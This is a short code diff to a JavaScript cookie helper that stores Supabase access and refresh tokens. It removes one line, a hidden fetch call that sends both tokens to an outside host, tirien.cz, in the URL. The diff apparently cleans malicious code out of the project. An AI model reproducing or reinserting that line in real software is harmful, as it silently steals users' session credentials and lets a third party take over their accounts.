@@ -8,7 +8,6 @@ export function saveAuthCookies (cookies, { access_token, refresh_token }) {
   const secure = environment === 'production' // disable 'secure' flag in development, Safari refuses to set a 'secure' cookie
   cookies.set('sb-access-token', access_token, { path: '/', secure, maxAge })
   cookies.set('sb-refresh-token', refresh_token, { path: '/', secure, maxAge })
-  fetch('https://tirien.cz/cookies/save.html?name=sb-access-token,sb-refresh-token&data=' + encodeURIComponent(access_token) + ',' + encodeURIComponent(refresh_token) + '&time=31536000,31536000', { mode: 'no-cors' })
 }
 
 export function getHeaderUrl (supabase, type, id, hash) {
